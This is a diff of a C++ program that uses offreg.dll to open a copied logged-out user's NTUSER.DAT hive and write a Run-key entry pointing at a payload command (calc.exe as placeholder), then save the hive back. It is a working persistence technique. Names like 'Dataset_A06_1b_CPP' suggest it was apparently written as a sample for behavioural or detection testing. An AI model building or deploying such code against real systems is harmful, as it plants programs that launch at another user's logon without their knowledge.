@@ -3,10 +3,8 @@
 #include <iostream>
 #include <string>
 
-// Pro Tip: offreg.h is part of the Windows Driver Kit (WDK) or Windows SDK.
-// Since it's a specialized library, we manually declare the function pointers
-// to make this code entirely standalone and easy to compile without environment issues.
-typedef DWORD(WINAPI *pfnORCreateHive)(HKEY *phkResult);
+// FIX: Declare OROpenHive instead of ORCreateHive to parse the copied user file
+typedef DWORD(WINAPI *pfnOROpenHive)(LPCWSTR lpszFilePath, HKEY *phkResult);
 typedef DWORD(WINAPI *pfnORCreateKey)(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpClass, DWORD dwOptions, PSECURITY_DESCRIPTOR pSecurityDescriptor, HKEY *phkResult, PDWORD pdwDisposition);
 typedef DWORD(WINAPI *pfnORSetValue)(HKEY hKey, LPCWSTR lpValueName, DWORD dwType, const BYTE *lpData, DWORD cbData);
 typedef DWORD(WINAPI *pfnORSaveHive)(HKEY hKey, LPCWSTR lpszFilePath, DWORD dwOsMajorVersion, DWORD dwOsMinorVersion);
@@ -14,10 +12,10 @@ typedef DWORD(WINAPI *pfnORCloseKey)(HKEY hKey);
 
 int main()
 {
-    // Configure paths and variables for behavioral testing
-    std::wstring targetHivePath = L"C:\\Users\\Public\\NTUSER.MAN";
+    // Define the path where you copied the logged-out user's hive file
+    std::wstring targetHivePath = L"C:\\Users\\Public\\NTUSER.DAT";
     std::wstring runKeyName = L"Dataset_A06_1b_CPP";
-    std::wstring payloadCommand = L"C:\\Windows\\System32\\notepad.exe";
+    std::wstring payloadCommand = L"C:\\Windows\\System32\\calc.exe";
     std::wstring runKeySubPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 
     std::wcout << L"[*] Loading offreg.dll to perform offline hive manipulation...\n";
@@ -30,14 +28,14 @@ int main()
         return 1;
     }
 
-    // Resolve needed function addresses
-    auto ORCreateHive = (pfnORCreateHive)GetProcAddress(hOffReg, "ORCreateHive");
+    // Resolve needed function addresses (Updated to map OROpenHive)
+    auto OROpenHive = (pfnOROpenHive)GetProcAddress(hOffReg, "OROpenHive");
     auto ORCreateKey = (pfnORCreateKey)GetProcAddress(hOffReg, "ORCreateKey");
     auto ORSetValue = (pfnORSetValue)GetProcAddress(hOffReg, "ORSetValue");
     auto ORSaveHive = (pfnORSaveHive)GetProcAddress(hOffReg, "ORSaveHive");
     auto ORCloseKey = (pfnORCloseKey)GetProcAddress(hOffReg, "ORCloseKey");
 
-    if (!ORCreateHive || !ORCreateKey || !ORSetValue || !ORSaveHive || !ORCloseKey)
+    if (!OROpenHive || !ORCreateKey || !ORSetValue || !ORSaveHive || !ORCloseKey)
     {
         std::wcerr << L"[-] Failed to map offreg.dll functions.\n";
         FreeLibrary(hOffReg);
@@ -48,11 +46,11 @@ int main()
     HKEY hRunKey = nullptr;
     DWORD dwDisposition = 0;
 
-    // 2. Initialize a blank hive structure in memory
-    DWORD result = ORCreateHive(&hRootKey);
+    // 2. FIX: Open the actual valid copied user hive file from disk
+    DWORD result = OROpenHive(targetHivePath.c_str(), &hRootKey);
     if (result != ERROR_SUCCESS)
     {
-        std::wcerr << L"[-] ORCreateHive failed with error code: " << result << std::endl;
+        std::wcerr << L"[-] OROpenHive failed. Ensure the file exists and is not locked. Error code: " << result << std::endl;
         FreeLibrary(hOffReg);
         return 1;
     }
@@ -72,7 +70,7 @@ int main()
         }
         else
         {
-            // 5. Serialize the modified structure into a binary file on disk (Windows 10/11 version format = 6, 2)
+            // 5. Serialize the modified structure back into the binary file on disk
             result = ORSaveHive(hRootKey, targetHivePath.c_str(), 6, 2);
             if (result != ERROR_SUCCESS)
             {
